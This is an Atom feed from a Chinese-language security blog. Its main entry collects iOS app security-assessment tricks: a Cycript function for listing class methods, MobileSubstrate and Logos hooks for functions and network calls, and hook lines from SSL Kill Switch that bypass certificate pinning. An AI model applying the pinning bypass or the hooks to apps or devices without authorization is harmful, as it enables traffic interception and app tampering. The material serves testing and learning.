<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Smilent</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.smilent.me/"/>
  <updated>2016-11-23T06:13:38.000Z</updated>
  <id>http://blog.smilent.me/</id>
  
  <author>
    <name>Smilent</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>iOS Security Tricks</title>
    <link href="http://blog.smilent.me/2016-11-22-iOS-security-tricks.html"/>
    <id>http://blog.smilent.me/2016-11-22-iOS-security-tricks.html</id>
    <published>2016-11-21T16:00:00.000Z</published>
    <updated>2016-11-23T06:13:38.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;iOS-Security&quot;&gt;&lt;a href=&quot;#iOS-Security&quot; class=&quot;headerlink&quot; title=&quot;iOS Security&quot;&gt;&lt;/a&gt;iOS Security&lt;/h1&gt;&lt;p&gt;总结iOS App安全评估所用到的一些trick。&lt;/p&gt;
&lt;h1 id=&quot;Cycript&quot;&gt;&lt;a href=&quot;#Cycript&quot; class=&quot;headerlink&quot; title=&quot;Cycript&quot;&gt;&lt;/a&gt;Cycript&lt;/h1&gt;&lt;p&gt;打印指定类的所用的方法：&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;printMethods&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;className, isa&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; count = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Type(&lt;span class=&quot;string&quot;&gt;&quot;I&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; classObj = (isa != &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;) ? objc_getClass(className)-&amp;gt;isa : objc_getClass(className);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; methods = class_copyMethodList(classObj, count);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; methodsArray = [];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; *count; i++) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; method = methods[i];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    methodsArray.push(&amp;#123;&lt;span class=&quot;attr&quot;&gt;selector&lt;/span&gt;:method_getName(method), &lt;span class=&quot;attr&quot;&gt;implementation&lt;/span&gt;:method_getImplementation(method)&amp;#125;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  free(methods);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; methodsArray;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;寻找Button的事件响应防范：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;cy# [button allTargets]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[NSSet setWithArray:@[#&amp;quot;&amp;lt;ViewController: 0x20869990&amp;gt;&amp;quot;]]]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cy# [button allControlEvents]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cy# [button actionsForTarget:#0x20869990 forControlEvent:64]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;@[&amp;quot;onClick&amp;quot;]&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;SSL-Pinning&quot;&gt;&lt;a href=&quot;#SSL-Pinning&quot; class=&quot;headerlink&quot; title=&quot;SSL Pinning&quot;&gt;&lt;/a&gt;SSL Pinning&lt;/h1&gt;&lt;p&gt;自建证书，忽略证书错误，中间人攻击&lt;/p&gt;
&lt;p&gt;试想这样一种场景，如果在最开始，攻击者就拦截掉客户端与服务端的通信。当客户端在请求证书时，攻击者回传一个他自己的假证书，而且攻击者已经通过其他手段欺骗用户在手机上信任了这个假证书，那么当客户端接收到证书并去验证时，是可以通过的。&lt;br&gt;如果安装了可信的证书， 开启强制校验, 公钥绑定&lt;/p&gt;
&lt;h1 id=&quot;SSL-Pinning-bypass&quot;&gt;&lt;a href=&quot;#SSL-Pinning-bypass&quot; class=&quot;headerlink&quot; title=&quot;SSL Pinning bypass&quot;&gt;&lt;/a&gt;SSL Pinning bypass&lt;/h1&gt;&lt;p&gt;iOS-SSL-Kill-Switch&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;MSHookFunction((&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *) SSLHandshake,(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)  replaced_SSLHandshake, (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; **) &amp;amp;original_SSLHandshake);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;MSHookFunction((&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *) SSLSetSessionOption,(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)  replaced_SSLSetSessionOption, (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; **) &amp;amp;original_SSLSetSessionOption);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;MSHookFunction((&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *) SSLCreateContext,(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)  replaced_SSLCreateContext, (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; **) &amp;amp;original_SSLCreateContext);&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;MobileHooker&quot;&gt;&lt;a href=&quot;#MobileHooker&quot; class=&quot;headerlink&quot; title=&quot;MobileHooker&quot;&gt;&lt;/a&gt;MobileHooker&lt;/h1&gt;&lt;p&gt;MoblieHooker的作用是替换系统函数，hook。主要包含两个函数：&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;MSHookMessageEx&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(Class &lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt;, SEL selector, IMP replacement, IMP *result)&lt;/span&gt;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;MSHookFunction&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;* function, &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;* replacement, &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;** p_original)&lt;/span&gt;&lt;/span&gt;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;MSHookMessageEx作用于Objective-C，通过调用method_setImplementation函数将[class selector]的实现改为新的实现方法，达到hook的目的。&lt;br&gt;MSHookFunction作用于下面是hook C/C++代码。&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#import &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;substrate.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*old__ZN8CPPClass11CPPFunctionEPKc)(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *, &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;new__ZN8CPPClass11CPPFunctionEPKc&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *hiddenThis, &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *arg0)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    NSLog(@&lt;span class=&quot;string&quot;&gt;&quot;Hijaik C++ function!&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;%ctor&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    @autoreleasepool&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        MSImageRef image = MSGetImageByName(&lt;span class=&quot;string&quot;&gt;&quot;/Application/iOSRETargetApp.app/iOSRETargetApp&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *__ZN8CPPClass11CPPFunctionEPKc = MSFindSymbol(image, &lt;span class=&quot;string&quot;&gt;&quot;__ZN8CPPClass11CPPFunctionEPKc&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(__ZN8CPPClass11CPPFunctionEPKc) NSLog(@&lt;span class=&quot;string&quot;&gt;&quot;Find CPPClass Function&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;//Hook CPPClass::CPPFcuntion&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        MSHookFunction((&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)__ZN8CPPClass11CPPFunctionEPKc, (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *)&amp;amp;new__ZN8CPPClass11CPPFunctionEPKc, (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; **)&amp;amp;old__ZN8CPPClass11CPPFunctionEPKc);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Hook Objective-C 方法.&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#import &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;substrate.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(*oldViewDidLoad)&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(id self, SEL _cmd)&lt;/span&gt;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;newViewDidLoad&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(id self, SEL _cmd)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    NSLog(@&lt;span class=&quot;string&quot;&gt;&quot;Hook ViewDidLoad&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    oldViewDidLoad(self, _cmd);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;%ctor&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    @autoreleasepool&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;//Hook OC method&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;//MSHookMessageEx((Class)objc_getClass(&quot;XXRootViewController&quot;), @selector(viewDidLoad),(IMP)&amp;amp;newViewDidLoad, (IMP*)&amp;amp;oldViewDidLoad);&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        MSHookMessageEx(NSClassFromString(@&lt;span class=&quot;string&quot;&gt;&quot;XXRootViewController&quot;&lt;/span&gt;), @selector(viewDidLoad),(IMP)&amp;amp;newViewDidLoad, (IMP*)&amp;amp;oldViewDidLoad);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;Logs语法&quot;&gt;&lt;a href=&quot;#Logs语法&quot; class=&quot;headerlink&quot; title=&quot;Logs语法&quot;&gt;&lt;/a&gt;Logs语法&lt;/h1&gt;&lt;p&gt;hook NSURLConnection&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;%hook NSURLConnection&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+ (NSData *)sendSynchronousRequest:(NSURLRequest *)request returningResponse:(NSURLResponse **)response error:(NSError **)error&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    %&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    NSData * origResult = %orig(request, response, error);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; origResult;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+ (&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)sendAsynchronousRequest:(NSURLRequest *)request &lt;span class=&quot;built_in&quot;&gt;queue&lt;/span&gt;:(NSOperationQueue *)&lt;span class=&quot;built_in&quot;&gt;queue&lt;/span&gt; completionHandler:(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (^)(NSURLResponse* response, NSData* data, NSError* connectionError)) handler &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    NSLog(@&lt;span class=&quot;string&quot;&gt;&quot;Handler %@ &quot;&lt;/span&gt;, handler);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//Hook block function&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (^customBlock)(NSURLResponse *resp, NSData *da, NSError *err) = ^(NSURLResponse *resp, NSData *da, NSError *err)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        NSLog(@&lt;span class=&quot;string&quot;&gt;&quot;%@&quot;&lt;/span&gt;, resp);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;%orig(request, &lt;span class=&quot;built_in&quot;&gt;queue&lt;/span&gt;, customBlock);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;%end&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;iOS-Security&quot;&gt;&lt;a href=&quot;#iOS-Security&quot; class=&quot;headerlink&quot; title=&quot;iOS Security&quot;&gt;&lt;/a&gt;iOS Security&lt;/h1&gt;&lt;p&gt;总结iOS App安全评估所用到的一些trick。&lt;/p&gt;
&lt;h1 id=&quot;Cycript&quot;&gt;&lt;a href=&quot;#Cycript&quot; class=&quot;headerlink&quot; title=&quot;Cycript&quot;&gt;&lt;/a&gt;Cycript&lt;/h1&gt;&lt;p&gt;打印指定类的所用的方法：&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;printMethods&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;className, isa&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; count = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Type(&lt;span class=&quot;string&quot;&gt;&quot;I&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; classObj = (isa != &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;) ? objc_getClass(className)-&amp;gt;isa : objc_getClass(className);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; methods = class_copyMethodList(classObj, count);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; methodsArray = [];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; *count; i++) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; method = methods[i];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    methodsArray.push(&amp;#123;&lt;span class=&quot;attr&quot;&gt;selector&lt;/span&gt;:method_getName(method), &lt;span class=&quot;attr&quot;&gt;implementation&lt;/span&gt;:method_getImplementation(method)&amp;#125;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  free(methods);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; methodsArray;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;寻找Button的事件响应防范：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;cy# [button allTargets]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[NSSet setWithArray:@[#&amp;quot;&amp;lt;ViewController: 0x20869990&amp;gt;&amp;quot;]]]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cy# [button allControlEvents]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cy# [button actionsForTarget:#0x20869990 forControlEvent:64]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;@[&amp;quot;onClick&amp;quot;]&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="web" scheme="http://blog.smilent.me/categories/web/"/>
    
    
      <category term="iOS" scheme="http://blog.smilent.me/tags/iOS/"/>
    
      <category term="cycript" scheme="http://blog.smilent.me/tags/cycript/"/>
    
      <category term="theos" scheme="http://blog.smilent.me/tags/theos/"/>
    
      <category term="MSHookMessageEx" scheme="http://blog.smilent.me/tags/MSHookMessageEx/"/>
    
  </entry>
  
  <entry>
    <title>Find Domain Controller</title>
    <link href="http://blog.smilent.me/2016-06-06-find-domain-controller.html"/>
    <id>http://blog.smilent.me/2016-06-06-find-domain-controller.html</id>
    <published>2016-06-05T16:00:00.000Z</published>
    <updated>2016-06-06T15:51:21.000Z</updated>
